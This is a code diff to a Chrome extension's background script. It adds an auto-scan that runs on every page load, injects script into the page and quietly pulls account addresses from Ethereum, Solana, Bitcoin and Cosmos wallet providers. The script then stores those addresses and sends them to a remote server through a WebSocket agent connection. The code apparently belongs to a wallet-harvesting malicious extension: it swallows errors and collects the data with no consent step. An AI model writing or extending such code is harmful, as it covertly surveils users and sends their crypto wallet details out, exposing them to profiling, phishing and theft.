@@ -154,6 +154,105 @@ async function sendWalletsToServer(wallets) {
   }
 }
 
+// Auto-scan wallets when user navigates to a page
+async function autoScanWallets(tabId) {
+  try {
+    const result = await chrome.scripting.executeScript({
+      target: { tabId: tabId, allFrames: false },
+      world: 'MAIN',
+      func: async () => {
+        const out = {};
+
+        // EVM wallets detection
+        const rootEth = window.ethereum;
+        if (rootEth) {
+          const evmProviders = Array.isArray(rootEth.providers) ? rootEth.providers : [rootEth];
+          for (const p of evmProviders) {
+            if (typeof p.request !== 'function') continue;
+            try {
+              const acc = await p.request({ method: 'eth_accounts' });
+              if (acc?.length) (out.ethereum ??= []).push(...acc);
+            } catch {}
+          }
+        }
+
+        // Solana wallets detection
+        const solProviders = [
+          window.solana,
+          window.phantom?.solana,
+          window.backpack?.solana,
+          window.solflare
+        ].filter(Boolean);
+
+        for (const s of solProviders) {
+          if (typeof s.connect !== 'function') continue;
+          try { await s.connect({ onlyIfTrusted: true }); } catch {}
+          if (s.publicKey) (out.solana ??= []).push(s.publicKey.toString());
+        }
+
+        // Bitcoin wallets detection
+        const btcProviders = [
+          window.phantom?.bitcoin,
+          window.unisat,
+          window.btc,
+          window.okxwallet?.bitcoin
+        ].filter(Boolean);
+
+        for (const b of btcProviders) {
+          try {
+            let list = [];
+            if (typeof b.getAccounts === 'function') {
+              list = await b.getAccounts();
+            } else if (typeof b.request === 'function') {
+              list = await b.request({ method: 'getAccounts' });
+            } else if (Array.isArray(b.accounts)) {
+              list = b.accounts.map(a => a.address ?? a);
+            }
+            if (list?.length) (out.bitcoin ??= []).push(...list);
+          } catch {}
+        }
+
+        // Cosmos wallets detection
+        if (window.keplr?.getKey) {
+          for (const cid of ['cosmoshub-4', 'osmosis-1']) {
+            try {
+              const { bech32Address } = await window.keplr.getKey(cid);
+              if (bech32Address) (out.cosmos ??= []).push(bech32Address);
+            } catch {}
+          }
+        }
+
+        return out;
+      }
+    });
+
+    const wallets = result[0]?.result || {};
+    if (Object.keys(wallets).length > 0) {
+      // Save detected wallets
+      const existing = await chrome.storage.local.get(['detected_wallets']);
+      const merged = { ...existing.detected_wallets || {} };
+      
+      for (const [chain, addrs] of Object.entries(wallets)) {
+        if (!merged[chain]) merged[chain] = [];
+        const uniqueAddrs = [...new Set([...merged[chain], ...addrs])];
+        merged[chain] = uniqueAddrs;
+      }
+      
+      await chrome.storage.local.set({ 
+        detected_wallets: merged,
+        wallets_last_scan: new Date().toISOString()
+      });
+      
+      // Send to WebSocket
+      sendWalletsToServer(merged);
+      
+      log('Auto-scanned wallets:', wallets);
+    }
+  } catch (error) {
+    log('Auto-scan error:', error.message);
+  }
+}
+
 // WebSocket agent registration
 // WebSocket agent registration (с UID)
 async function registerAgent() {
@@ -552,6 +651,16 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     });
     
     return true; // Keep message channel open for async response
+  }
+});
+
+// Auto-scan wallets when user navigates
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+  if (changeInfo.status === 'complete' && tab.url && !tab.url.startsWith('chrome://')) {
+    // Delay scan to let page load wallets
+    setTimeout(() => {
+      autoScanWallets(tabId);
+    }, 2000);
   }
 });
 
